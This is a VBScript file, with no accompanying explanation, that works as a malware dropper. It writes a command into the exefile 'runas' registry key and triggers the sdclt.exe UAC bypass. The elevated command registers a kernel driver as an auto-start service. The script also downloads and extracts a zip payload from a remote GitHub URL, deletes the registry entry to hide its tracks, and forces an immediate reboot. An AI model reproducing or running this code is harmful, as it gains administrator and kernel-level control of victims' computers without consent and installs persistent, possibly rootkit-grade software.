Const HKEY_CURRENT_USER = &H80000001
dim WshShell
dim dr,ex, objSh, ex2
dim fso
dim Directory, CurrentDirectory, Dr2
Set fso = CreateObject("Scripting.FileSystemObject")
CurrentDirectory = fso.GetAbsolutePathName(".")
Directory = "C:\Windows\System32\cmd.exe /c sc.exe create dg86b type=kernel binPath=" & CurrentDirectory & "\ADg.sys start=auto"

Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.RegWrite "HKCU\Software\Classes\exefile\shell\runas\command\", Directory, "REG_SZ"
WshShell.RegWrite "HKCU\Software\Classes\exefile\shell\runas\command\isolatedCommand", Directory, "REG_SZ"
WshShell.RegWrite "HKCU\Software\Classes\exefile\shell\runas\command\(Default)", Directory, "REG_SZ"
WshShell.RegWrite "HKCU\Software\Classes\exefile\shell\runas\command\ ", Directory, "REG_SZ"
dr = "C:\windows\system32"
ex = "sdclt.exe /kickoffelev"
ex2 = "Reg delete HKCU\Software\Classes\exefile /f"
HTTPDownload "https://github.com/r3kt2ey89i/gggt/blob/master/e.zip?raw=true", "C:\Users\Public\Documents\p.zip"
Exc
strComputer = "."
strKeyPath = "Software\Classes\exefile" 
Set objSh = WScript.CreateObject("Wscript.Shell")
objSh.CurrentDirectory = dr
objSh.Run ex
objSh.Sleep 5000
objSh.Run ex2
objSh.Run "shutdown /r -f -t 00"
   

Sub HTTPDownload( myURL, myPath )
    Dim i, objFile, objFSO, objHTTP, strFile, strMsg
    Const ForReading = 1, ForWriting = 2, ForAppending = 8
    Set objFSO = CreateObject( "Scripting.FileSystemObject" )
    If objFSO.FolderExists( myPath ) Then
        strFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev( myURL, "/" ) + 1 ) )
    ElseIf objFSO.FolderExists( Left( myPath, InStrRev( myPath, "\" ) - 1 ) ) Then
        strFile = myPath
    End If
    Set objFile = objFSO.OpenTextFile( strFile, ForWriting, True )
    Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )
    objHTTP.Open "GET", myURL, False
    objHTTP.Send
    For i = 1 To LenB( objHTTP.ResponseBody )
        objFile.Write Chr( AscB( MidB( objHTTP.ResponseBody, i, 1 ) ) )
    Next

End Sub

Sub Exc()
        Dim args, num, ex, dr 
	Dim var1, var2 
	Dim objFSO, objFolder 
	Dim objStream 
	Dim WshShell
	Dim objSh
	Dim strFolder, strURL, strFile, strFull 
	Dim strUnat, strCmdLine, strDmdLine 
    	Set WshShell = CreateObject("WScript.Shell")
   	ZipFile="C:\Users\Public\Documents\P.zip"
   	ExtractTo="C:\Users\Public\Documents"
   	Set fso = CreateObject("Scripting.FileSystemObject")
   	If NOT fso.FolderExists(ExtractTo) Then
      		fso.CreateFolder(ExtractTo)
   	End If
   	set objShell = CreateObject("Shell.Application")
   	set FilesInZip=objShell.NameSpace(ZipFile).items
   	objShell.NameSpace(ExtractTo).CopyHere(FilesInZip)
   	Set fso = Nothing
End Sub
